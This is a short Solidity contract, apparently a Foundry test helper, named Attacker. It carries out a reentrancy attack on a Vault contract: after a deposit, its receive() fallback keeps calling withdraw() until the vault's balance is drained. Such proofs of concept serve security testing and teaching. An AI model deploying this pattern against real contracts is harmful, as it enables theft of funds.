pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract Attacker {
    Vault public vault;
    uint256 public constant STEP = 1 ether;
    uint256 public hops;

    constructor(Vault _v) {
        vault = _v;
    }

    function attack() external payable {
        emit log_named_uint("start bal", address(this).balance);
        vault.deposit{value: msg.value}();
        emit log_named_uint("after deposit bal", address(this).balance);
        vault.withdraw();
    }

    receive() external payable {
        hops++;
        emit log_named_uint("recv, vault bal", address(vault).balance);
        if (address(vault).balance >= STEP) {
            vault.withdraw();
        }
    }

    event log_named_uint(string name, uint256 val);
}

